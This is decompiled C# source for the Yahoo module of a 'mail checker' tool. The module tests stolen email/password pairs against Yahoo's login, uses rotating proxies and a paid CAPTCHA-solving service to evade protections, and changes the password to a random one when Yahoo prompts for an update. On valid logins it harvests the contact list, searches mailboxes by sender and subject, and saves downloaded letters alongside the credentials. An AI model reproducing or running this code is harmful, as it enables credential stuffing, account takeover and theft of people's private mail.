using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Helpers;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Yahoo;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Web
{
	// Token: 0x020000BD RID: 189
	public class YahooClient
	{
		// Token: 0x1700013D RID: 317
		// (get) Token: 0x060005FB RID: 1531 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060005FC RID: 1532 RVA: 0x00009DA5 File Offset: 0x00007FA5
		public YahooClient(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x060005FD RID: 1533 RVA: 0x000293D0 File Offset: 0x000275D0
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x060005FE RID: 1534 RVA: 0x00029444 File Offset: 0x00027644
		public OperationResult Login()
		{
			int num = 0;
			OperationResult operationResult2;
			for (;;)
			{
				this.Reset();
				OperationResult operationResult = this.CreateSession();
				if (operationResult == OperationResult.Blocked)
				{
					if (!ProxySettings.Instance.UseProxy)
					{
						return OperationResult.Error;
					}
				}
				if (operationResult == OperationResult.Ok)
				{
					string captchaUrl;
					operationResult = this.ConfirmUsername(out captchaUrl);
					if (operationResult != OperationResult.HttpError)
					{
						if (operationResult == OperationResult.Captcha)
						{
							if (WebSettings.Instance.SolveCaptcha && !string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
							{
								operationResult2 = this.GetSitekey(captchaUrl);
								if (operationResult2 == OperationResult.Error)
								{
									break;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
								ValueTuple<OperationResult, string> valueTuple = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(YahooClient._siteKey, "https://login.yahoo.net");
								OperationResult item = valueTuple.Item1;
								string item2 = valueTuple.Item2;
								if (item == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (item == OperationResult.HttpError)
								{
									continue;
								}
								operationResult2 = this.ConfirmCaptcha(item2, false);
								if (operationResult2 == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (operationResult2 == OperationResult.HttpError)
								{
									continue;
								}
							}
							else
							{
								if (!ProxySettings.Instance.UseProxy)
								{
									return OperationResult.Captcha;
								}
								if (WebSettings.Instance.RebruteCaptcha && num < WebSettings.Instance.RebruteCaptchaLimit)
								{
									num++;
									continue;
								}
								return OperationResult.Captcha;
							}
						}
						else if (operationResult != OperationResult.Ok)
						{
							return operationResult;
						}
						string text;
						operationResult = this.ConfirmPassword(out text);
						if (operationResult != OperationResult.HttpError)
						{
							if (operationResult == OperationResult.Captcha)
							{
								if (!WebSettings.Instance.SolveCaptcha || string.IsNullOrEmpty(WebSettings.Instance.CaptchaSolvationKey))
								{
									return OperationResult.Captcha;
								}
								ValueTuple<OperationResult, string> valueTuple2 = CaptchaHelpers.CreateInstance().SolveRecaptchaV2Proxyless(YahooClient._siteKey, "https://login.yahoo.net");
								OperationResult item3 = valueTuple2.Item1;
								string item4 = valueTuple2.Item2;
								if (item3 == OperationResult.Error)
								{
									return OperationResult.Error;
								}
								if (item3 == OperationResult.HttpError)
								{
									continue;
								}
								operationResult = this.ConfirmSecondCaptcha(item4);
							}
							else if (operationResult != OperationResult.Ok)
							{
								return operationResult;
							}
							if (operationResult != OperationResult.HttpError)
							{
								return operationResult;
							}
						}
					}
				}
			}
			return operationResult2;
		}

		// Token: 0x060005FF RID: 1535 RVA: 0x000295F8 File Offset: 0x000277F8
		public OperationResult CreateSession()
		{
			try
			{
				string text = this._httpRequest.Get("https://login.yahoo.com", null).ToString();
				if (text == "rate limited")
				{
					return OperationResult.Blocked;
				}
				Match match = Regex.Match(text, "name=\"crumb\" value=\"(.+?)\"");
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._crumb = match.Groups[1].Value;
				match = Regex.Match(text, "name=\"acrumb\" value=\"(.+?)\"");
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._acrumb = match.Groups[1].Value;
				match = Regex.Match(text, "name=\"sessionIndex\" value=\"(.+?)\"");
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._sessionIndex = match.Groups[1].Value;
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000600 RID: 1536 RVA: 0x00029704 File Offset: 0x00027904
		public OperationResult ConfirmUsername(out string captchaUrl)
		{
			captchaUrl = null;
			this.WaitPause();
			try
			{
				this._httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>("crumb", this._crumb),
					new KeyValuePair<string, string>("acrumb", this._acrumb),
					new KeyValuePair<string, string>("sessionIndex", this._sessionIndex),
					new KeyValuePair<string, string>("deviceCapability", "{\"pa\":{\"status\":false}}"),
					new KeyValuePair<string, string>("username", this._mailbox.Address)
				}, false, null);
				string text = this._httpRequest.Post("https://login.yahoo.com", formUrlEncodedContent).ToString();
				if (text.ContainsOne(new string[]
				{
					"INVALID_USERNAME",
					"ERROR_NOTFOUND",
					"account /challenge/push?src=noSrc",
					"Sorry, we don't recognize this email",
					"account/challenge/fail"
				}))
				{
					return OperationResult.Bad;
				}
				if (text.ContainsOne(new string[]
				{
					"challenge-selector",
					"account/challenge/phone-obfuscation",
					">Open any Yahoo app<",
					"account/challenge/wait",
					"/account/challenge/yak-code"
				}))
				{
					return OperationResult.Blocked;
				}
				if (!text.Contains("recaptcha"))
				{
					if (text.Contains("password"))
					{
						return OperationResult.Ok;
					}
					if (text == "rate limited" && ProxySettings.Instance.UseProxy)
					{
						return OperationResult.HttpError;
					}
					return OperationResult.Error;
				}
				else
				{
					Match match = Regex.Match(text, "\"location\":\"(.+?)\"");
					if (!match.Success)
					{
						return OperationResult.Blocked;
					}
					captchaUrl = "https://login.yahoo.com" + match.Groups[1].Value;
					return OperationResult.Captcha;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000601 RID: 1537 RVA: 0x00029970 File Offset: 0x00027B70
		public OperationResult ConfirmPassword(out string captchaUrl)
		{
			captchaUrl = null;
			this.WaitPause();
			try
			{
				this._httpRequest.Reconnect = true;
				this._httpRequest.AddUrlParam("done", "https://www.yahoo.com/");
				this._httpRequest.AddUrlParam("sessionIndex", this._sessionIndex);
				this._httpRequest.AddUrlParam("acrumb", this._acrumb);
				this._httpRequest.AddUrlParam("display", "login");
				this._httpRequest.AddUrlParam("authMechanism", "primary");
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>("crumb", this._crumb),
					new KeyValuePair<string, string>("acrumb", this._acrumb),
					new KeyValuePair<string, string>("sessionIndex", this._sessionIndex),
					new KeyValuePair<string, string>("deviceCapability", "{\"pa\":{\"status\":false}}"),
					new KeyValuePair<string, string>("username", this._mailbox.Address),
					new KeyValuePair<string, string>("displayName", this._mailbox.Address),
					new KeyValuePair<string, string>("password", this._mailbox.Password),
					new KeyValuePair<string, string>("passwordContext", "normal"),
					new KeyValuePair<string, string>("verifyPassword", "Next")
				}, false, null);
				string text = this._httpRequest.Post("https://login.yahoo.com/account/challenge/password", formUrlEncodedContent).ToString();
				if (!text.Contains("/account/update?context"))
				{
					if (text.ContainsOne(new string[]
					{
						"guce.yahoo.com/consent",
						"https://login.yahoo.com/account/comm-channel/refresh",
						"review/account-health-check"
					}))
					{
						return OperationResult.Ok;
					}
					if (this._httpRequest.Response.Location != null && this._httpRequest.Response.Location.Contains("https://login.yahoo.com/account/comm-channel/refresh"))
					{
						return OperationResult.Ok;
					}
					if (!text.Contains("recaptcha"))
					{
						if (text.ContainsOne(new string[]
						{
							"challenge-selector",
							"account/challenge/phone-obfuscation",
							">Open any Yahoo app<"
						}))
						{
							return OperationResult.Blocked;
						}
						if (text.ContainsOne(new string[]
						{
							"INVALID_PASSWORD",
							"challenge/password",
							"/account/challenge/fail?",
							"went wrong. Please try again",
							"Get Account Key code",
							"recognize"
						}))
						{
							return OperationResult.Bad;
						}
						if (text == "rate limited" && ProxySettings.Instance.UseProxy)
						{
							return OperationResult.HttpError;
						}
						return OperationResult.Error;
					}
					else
					{
						Match match = Regex.Match(text, "Found. Redirecting to (.+)");
						if (match.Success)
						{
							captchaUrl = "https://login.yahoo.com" + match.Groups[1].Value;
							return OperationResult.Captcha;
						}
						return OperationResult.Blocked;
					}
				}
				else
				{
					text = this._httpRequest.Get(this._httpRequest.Response.Location, null).ToString();
					Match match2 = Regex.Match(text, "<a href=\"(.+?)\"\\n.+\\n.+Yes");
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					string text2 = WebUtility.HtmlDecode("https://login.yahoo.com" + match2.Groups[1].Value);
					match2 = Regex.Match(text2, "scrumb=(.+?)&");
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					string value = match2.Groups[1].Value;
					match2 = Regex.Match(text2, "context=(.+?)&");
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					string value2 = match2.Groups[1].Value;
					string text3 = PasswordHelper.Generate(16);
					text = this._httpRequest.Get(text2, null).ToString();
					if (text.Contains("m.att.com"))
					{
						return OperationResult.Ok;
					}
					match2 = Regex.Match(text, "crumb=' \\+ encodeURIComponent\\('(.+?)'\\)");
					if (!match2.Success)
					{
						return OperationResult.Ok;
					}
					this._crumb = match2.Groups[1].Value;
					formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
					{
						new KeyValuePair<string, string>("scrumb", value),
						new KeyValuePair<string, string>("crumb", this._crumb),
						new KeyValuePair<string, string>("ctx", value2),
						new KeyValuePair<string, string>("password", text3)
					}, false, null);
					text = this._httpRequest.Post(text2, formUrlEncodedContent).ToString();
					if (text.Contains("account/change-password/success"))
					{
						this._mailbox.Password = text3;
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000602 RID: 1538 RVA: 0x00029F40 File Offset: 0x00028140
		public OperationResult GetSitekey(string captchaUrl)
		{
			if (YahooClient._siteKey != null)
			{
				return OperationResult.Ok;
			}
			this.WaitPause();
			try
			{
				Match match = Regex.Match(this._httpRequest.Get(captchaUrl, null).ToString(), "siteKey=(.+?)&");
				if (match.Success)
				{
					YahooClient._siteKey = match.Groups[1].Value;
					return OperationResult.Ok;
				}
				return OperationResult.Error;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000603 RID: 1539 RVA: 0x00029FCC File Offset: 0x000281CC
		public OperationResult ConfirmCaptcha(string captchaResult, bool isSecondCaptcha = false)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam("done", "https://mail.yahoo.com/d?activity=ybar-mail");
				this._httpRequest.AddUrlParam("sessionIndex", this._sessionIndex);
				this._httpRequest.AddUrlParam("acrumb", this._acrumb);
				this._httpRequest.AddUrlParam("display", "login");
				this._httpRequest.AddUrlParam("authMechanism", "primary");
				this._httpRequest.AddUrlParam("activity", "header-signin");
				this._httpRequest.AddUrlParam(".intl", "en");
				this._httpRequest.AddUrlParam(".lang", "en-US");
				if (isSecondCaptcha)
				{
					this._httpRequest.AddUrlParam("e", "true");
					this._httpRequest.AddUrlParam("pcn", "password");
				}
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>("g-recaptcha-response", captchaResult),
					new KeyValuePair<string, string>("acrumb", this._acrumb),
					new KeyValuePair<string, string>("sessionIndex", this._sessionIndex),
					new KeyValuePair<string, string>("context", "primary")
				}, false, null);
				if (!this._httpRequest.Post("https://login.yahoo.com/account/challenge/recaptcha", formUrlEncodedContent).ToString().Contains("Found"))
				{
					return OperationResult.Error;
				}
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000604 RID: 1540 RVA: 0x0002A204 File Offset: 0x00028404
		public OperationResult ConfirmSecondCaptcha(string captchaResult)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam("done", "https://mail.yahoo.com/d?activity=ybar-mail");
				this._httpRequest.AddUrlParam("sessionIndex", this._sessionIndex);
				this._httpRequest.AddUrlParam("acrumb", this._acrumb);
				this._httpRequest.AddUrlParam("display", "login");
				this._httpRequest.AddUrlParam("authMechanism", "primary");
				this._httpRequest.AddUrlParam("activity", "header-signin");
				this._httpRequest.AddUrlParam(".intl", "en");
				this._httpRequest.AddUrlParam(".lang", "en-US");
				this._httpRequest.AddUrlParam("e", "true");
				this._httpRequest.AddUrlParam("pcn", "password");
				FormUrlEncodedContent formUrlEncodedContent = new FormUrlEncodedContent(new List<KeyValuePair<string, string>>
				{
					new KeyValuePair<string, string>("g-recaptcha-response", captchaResult),
					new KeyValuePair<string, string>("acrumb", this._acrumb),
					new KeyValuePair<string, string>("sessionIndex", this._sessionIndex),
					new KeyValuePair<string, string>("context", "primary")
				}, false, null);
				string original = this._httpRequest.Post("https://login.yahoo.com/account/challenge/recaptcha", formUrlEncodedContent).ToString();
				if (original.ContainsOne(new string[]
				{
					"guce.yahoo.com/consent",
					"https://login.yahoo.com/account/comm-channel/refresh"
				}))
				{
					return OperationResult.Ok;
				}
				if (this._httpRequest.Response.Location != null && this._httpRequest.Response.Location.Contains("https://login.yahoo.com/account/comm-channel/refresh"))
				{
					return OperationResult.Ok;
				}
				if (original.ContainsOne(new string[]
				{
					"challenge-selector",
					"account/challenge/phone-obfuscation",
					">Open any Yahoo app<"
				}))
				{
					return OperationResult.Blocked;
				}
				if (!original.ContainsOne(new string[]
				{
					"INVALID_PASSWORD",
					"challenge/password",
					"/account/challenge/fail?",
					"went wrong. Please try again",
					"Get Account Key code",
					"recognize"
				}))
				{
					return OperationResult.Error;
				}
				return OperationResult.Bad;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000605 RID: 1541 RVA: 0x0002A528 File Offset: 0x00028728
		public OperationResult GetSearchToken()
		{
			this.WaitPause();
			try
			{
				string input = this._httpRequest.Get("https://mail.yahoo.com", null).ToString();
				Match match = Regex.Match(input, "\"mailWssid\":\"(.+?)\"");
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._wssid = match.Groups[1].Value;
				match = Regex.Match(input, "\"selectedMailbox\":{\"id\":\"(.+?)\"");
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				this._mailboxId = match.Groups[1].Value;
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000606 RID: 1542 RVA: 0x0002A5E8 File Offset: 0x000287E8
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search && !SearchSettings.Instance.ParseContacts)
			{
				return;
			}
			this._httpRequest.Reconnect = false;
			if (this.GetSearchToken() != OperationResult.Ok)
			{
				return;
			}
			OperationResult operationResult = OperationResult.Retry;
			bool flag = false;
			bool flag2 = false;
			List<Request> list = new List<Request>();
			new List<Mid>();
			while (operationResult == OperationResult.Retry)
			{
				if (!flag && SearchSettings.Instance.ParseContacts)
				{
					operationResult = this.DownloadContacts();
					if (operationResult == OperationResult.Ok || operationResult == OperationResult.Bad)
					{
						flag = true;
					}
				}
				else
				{
					operationResult = OperationResult.Ok;
				}
				if (operationResult != OperationResult.Retry)
				{
					if (!flag2 && this.SearchSettings.Search)
					{
						operationResult = this.SearchMessages(list);
						if (operationResult == OperationResult.Ok)
						{
							flag2 = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult == OperationResult.Retry)
					{
						if (!ProxySettings.Instance.UseProxy)
						{
							break;
						}
						this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
					}
					else if (operationResult == OperationResult.Bad)
					{
						break;
					}
				}
				else
				{
					if (!ProxySettings.Instance.UseProxy)
					{
						break;
					}
					this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
				}
			}
			foreach (Request request in list)
			{
				int count = request.Count;
				if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
				{
					MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
				}
			}
		}

		// Token: 0x06000607 RID: 1543 RVA: 0x0002A79C File Offset: 0x0002899C
		public OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam("count", 100);
				this._httpRequest.AddUrlParam("group_by", 1);
				this._httpRequest.AddUrlParam("appId", "YMailNorrin");
				this._httpRequest.AddUrlParam("mailboxid", this._mailboxId);
				this._httpRequest.AddUrlParam("mailboxId", this._mailboxId);
				this._httpRequest.AddUrlParam("mailboxemail", this._mailbox.Address);
				this._httpRequest.AddUrlParam("mailboxtype", "FREE");
				foreach (object obj in Regex.Matches(this._httpRequest.Get("https://mail.yahoo.com/xobni/v4/contacts/alpha", null).ToString(), "\"ep\":\"smtp:(.+?)\""))
				{
					FileManager.SaveContact(((Match)obj).Groups[1].Value);
				}
				return OperationResult.Ok;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000608 RID: 1544 RVA: 0x0002A948 File Offset: 0x00028B48
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => r.Sender == request.Sender && r.Body == request.Body && r.Subject == request.Subject);
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedMids = new HashSet<Mid>();
						request3.SavedMids = new HashSet<Mid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedMids != null && request3.SavedMids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					Request request2 = request3;
					if (!request2.FindedMids.Any<Mid>())
					{
						OperationResult operationResult = this.Search(request2);
						if (operationResult == OperationResult.Error)
						{
							request2.IsChecked = true;
							continue;
						}
						if (operationResult == OperationResult.HttpError)
						{
							return OperationResult.Retry;
						}
					}
					if (this.SearchSettings.DownloadLetters)
					{
						if (CheckerSettings.Instance.UsePop3Limit && request2.FindedMids.Count > CheckerSettings.Instance.Pop3Limit)
						{
							request3.FindedMids = new HashSet<Mid>(request3.FindedMids.Take(CheckerSettings.Instance.Pop3Limit));
						}
						using (HashSet<Mid>.Enumerator enumerator2 = request3.FindedMids.GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								Mid mid = enumerator2.Current;
								if (!request3.SavedMids.Any((Mid u) => u == mid))
								{
									if (request3.SavedMids.Count >= this.SearchSettings.DownloadLettersLimit)
									{
										break;
									}
									MailMessage message;
									OperationResult operationResult2 = this.FetchMessage(mid, this.SearchSettings.SearchAttachments && this.SearchSettings.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded, out message);
									if (operationResult2 != OperationResult.Error)
									{
										if (operationResult2 == OperationResult.HttpError)
										{
											return OperationResult.Retry;
										}
										request3.SavedMids.Add(mid);
										FileManager.SaveEazyWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
									}
									else
									{
										request3.SavedMids.Add(mid);
									}
								}
							}
						}
					}
					request2.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000609 RID: 1545 RVA: 0x0002ABDC File Offset: 0x00028DDC
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				this._httpRequest.AddUrlParam("multipart", "true");
				this._httpRequest.AddUrlParam("appid", "YMailNorrin");
				this._httpRequest.AddUrlParam("clientId", "mailsearch");
				this._httpRequest.AddUrlParam("allowGoogleDocs", "1");
				this._httpRequest.AddUrlParam("timeout", "60000");
				this._httpRequest.AddUrlParam("mailboxid", this._mailboxId);
				this._httpRequest.AddUrlParam("mailboxId", this._mailboxId);
				this._httpRequest.AddUrlParam("mailboxemail", this._mailbox.Address);
				this._httpRequest.AddUrlParam("mailboxtype", "FREE");
				this._httpRequest.AddUrlParam("query", this.BuildSearchQuery(searchRequest));
				this._httpRequest.AddUrlParam("textualSuggest", "1");
				this._httpRequest.AddUrlParam("wssid", this._wssid);
				this._httpRequest.AddUrlParam("vertical", "MESSAGES");
				string input = this._httpRequest.Get("https://mail.yahoo.com/psearch/v3/items", null).ToString();
				Match match = Regex.Match(input, "\"totalHits\":(.+?),");
				if (!match.Success)
				{
					return OperationResult.Error;
				}
				if (!(match.Groups[1].Value == "0"))
				{
					match = Regex.Match(input, "\"items\":(.+?),\"totalHits");
					if (match.Success)
					{
						try
						{
							List<MessagePreview> list = JsonConvert.DeserializeObject<List<MessagePreview>>(match.Groups[1].Value);
							Encoding encoding = Encoding.GetEncoding("UTF-8");
							Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
							foreach (MessagePreview messagePreview in list)
							{
								byte[] bytes = encoding2.GetBytes(messagePreview.Subject);
								byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
								messagePreview.Subject = encoding2.GetString(bytes2).Replace("^_", "");
								if (this.Validate(searchRequest, messagePreview.FromList.First<PreviewFrom>().Id, messagePreview.Subject, messagePreview.DateTime))
								{
									searchRequest.FindedMids.Add(new Mid(messagePreview.Mid));
								}
							}
						}
						catch
						{
							return OperationResult.Error;
						}
					}
					searchRequest.Count = searchRequest.FindedMids.Count;
					return OperationResult.Ok;
				}
				return OperationResult.Ok;
			}
			catch (HttpException)
			{
				return OperationResult.HttpError;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x0600060A RID: 1546 RVA: 0x0002AF94 File Offset: 0x00029194
		private OperationResult FetchMessage(Mid mid, bool downloadAttachments, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				this._httpRequest.AddUrlParam("name", "messages.getBodies");
				this._httpRequest.AddUrlParam("appId", "YMailNorrin");
				this._httpRequest.AddUrlParam("wssid", this._wssid);
				string text = string.Concat(new string[]
				{
					"{\"requests\":[{\"id\":\"GetSimpleBody_0\",\"uri\":\"/ws/v3/mailboxes/@.id==",
					this._mailboxId,
					"/messages/@.id==",
					mid.MID,
					"/content/simplebody\",\"method\":\"GET\",\"payloadType\":\"embedded\",\"suppressResponse\":false}],\"responseType\":\"json\"}"
				});
				Match match = Regex.Match(this._httpRequest.Post("https://mail.yahoo.com/ws/v3/batch", text, "application/json").ToString(), "\"response\":{\"result\":(.+?)},\"httpCode\"");
				if (match.Success)
				{
					try
					{
						MessageWrapper messageWrapper = JsonConvert.DeserializeObject<MessageWrapper>(match.Groups[1].Value);
						Encoding encoding = Encoding.GetEncoding("UTF-8");
						Encoding encoding2 = Encoding.GetEncoding("Windows-1251");
						message.Date = messageWrapper.Message.Headers.DateTime;
						byte[] bytes = encoding2.GetBytes(messageWrapper.Message.Headers.Subject);
						byte[] bytes2 = Encoding.Convert(encoding, encoding2, bytes);
						message.Subject = encoding2.GetString(bytes2);
						bytes = encoding2.GetBytes(messageWrapper.SimpleBody.Html);
						bytes2 = Encoding.Convert(encoding, encoding2, bytes);
						message.From = messageWrapper.Message.Headers.From.First<From>().Email;
						message.AlternateViews.Add(new Attachment("text/html", "<head><meta http-equiv='Content-Type' content='text/html;charset=UTF-8'></head>" + encoding2.GetString(bytes2)));
					}
					catch
					{
						return OperationResult.Error;
					}
				}
				return OperationResult.Ok;
			}
			catch (HttpException)
			{
				return OperationResult.HttpError;
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Error;
		}

		// Token: 0x0600060B RID: 1547 RVA: 0x0002B200 File Offset: 0x00029400
		private string BuildSearchQuery(Request request)
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (request.Sender != null)
			{
				stringBuilder.Append("from:" + request.Sender + " ");
			}
			if (request.Subject != null)
			{
				stringBuilder.Append("subject:" + request.Subject);
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null)
					{
						stringBuilder.Append("after:\"" + SearchSettings.Instance.DateFrom.Value.ToString("yyyy-MM-dd") + "\" ");
					}
					if (SearchSettings.Instance.DateTo != null)
					{
						stringBuilder.Append("before:\"" + SearchSettings.Instance.DateTo.Value.ToString("yyyy-MM-dd") + "\" ");
					}
				}
			}
			else
			{
				if (request.DateFrom != null)
				{
					stringBuilder.Append("after:\"" + request.DateFrom.Value.ToString("yyyy-MM-dd") + "\" ");
				}
				if (request.DateTo != null)
				{
					stringBuilder.Append("before:\"" + request.DateTo.Value.ToString("yyyy-MM-dd") + "\" ");
				}
			}
			if (request.Body != null)
			{
				stringBuilder.Append(request.Body);
			}
			return stringBuilder.ToString().Trim(new char[]
			{
				' '
			});
		}

		// Token: 0x0600060C RID: 1548 RVA: 0x0002918C File Offset: 0x0002738C
		private bool Validate(Request request, string from, string subject, DateTime date)
		{
			if (request.Sender != null && !from.ContainsIgnoreCase(request.Sender))
			{
				return false;
			}
			if (request.Subject != null && !subject.ContainsIgnoreCase(request.Subject))
			{
				return false;
			}
			if (!request.CheckDate)
			{
				if (SearchSettings.Instance.CheckDate)
				{
					if (SearchSettings.Instance.DateFrom != null && date < SearchSettings.Instance.DateFrom.Value)
					{
						return false;
					}
					if (SearchSettings.Instance.DateTo != null && date > SearchSettings.Instance.DateTo.Value.AddDays(1.0))
					{
						return false;
					}
				}
			}
			else
			{
				if (request.DateFrom != null && date < request.DateFrom.Value)
				{
					return false;
				}
				if (request.DateTo != null && date > request.DateTo.Value.AddDays(1.0))
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x0600060D RID: 1549 RVA: 0x0002B404 File Offset: 0x00029604
		private void Reset()
		{
			HttpRequest httpRequest = this._httpRequest;
			if (httpRequest != null)
			{
				httpRequest.Close();
			}
			this._httpRequest = new HttpRequest
			{
				ConnectTimeout = CheckerSettings.Instance.Timeout * 1000,
				ReadWriteTimeout = CheckerSettings.Instance.Timeout * 1000,
				Cookies = new CookieDictionary(false),
				IgnoreProtocolErrors = true,
				AllowAutoRedirect = false,
				KeepAlive = false,
				Reconnect = false,
				ReconnectLimit = 2,
				UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.167 Safari/537.36"
			};
			if (ProxySettings.Instance.UseProxy)
			{
				this._httpRequest.Proxy = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600060E RID: 1550 RVA: 0x00009B57 File Offset: 0x00007D57
		private bool IsAboveLimit(int count)
		{
			return !SearchSettings.Instance.UseSearchLimit || count >= SearchSettings.Instance.SearchLimit;
		}

		// Token: 0x0600060F RID: 1551 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000324 RID: 804
		private Mailbox _mailbox;

		// Token: 0x04000325 RID: 805
		private HttpRequest _httpRequest;

		// Token: 0x04000326 RID: 806
		private string _crumb;

		// Token: 0x04000327 RID: 807
		private string _acrumb;

		// Token: 0x04000328 RID: 808
		private string _sessionIndex;

		// Token: 0x04000329 RID: 809
		private string _wssid;

		// Token: 0x0400032A RID: 810
		private string _mailboxId;

		// Token: 0x0400032B RID: 811
		private static string _siteKey;
	}
}
